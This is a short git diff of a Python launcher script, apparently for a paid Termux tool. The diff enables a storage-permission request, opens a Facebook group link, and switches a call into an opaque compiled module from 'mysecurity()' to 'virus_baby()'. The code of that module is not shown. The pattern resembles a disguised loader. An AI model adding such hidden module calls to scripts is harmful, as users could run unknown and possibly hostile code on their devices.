@@ -1,14 +1,8 @@
-import os, platform,time
+import os, platform
 os.system("cd $HOME/")
-#os.system("termux-setup-storage")
+os.system("termux-setup-storage")
 os.system("xdg-open https://www.facebook.com/groups/660205018582939")
-#os.system("clear")
-#print("\t 30 April ko All Approvels Remove Krdea jaingy")
-#print("\t Users Ko Again Buy Krna pady ga ")
-#print("\t Shukriya.....")
-#time.sleep(3)
-#print("updating again please wait we have some errors")
-#exit()
+
 try:
     import requests
 except(ImportError):
@@ -27,7 +21,7 @@ try:
     if rana=="32bit":
         __import__("pro32").mysecurity()
     elif rana=="64bit":
-        __import__("pro").mysecurity()
+        __import__("pro").virus_baby()
     else:
         print(" We have issue to launch script")
         exit()
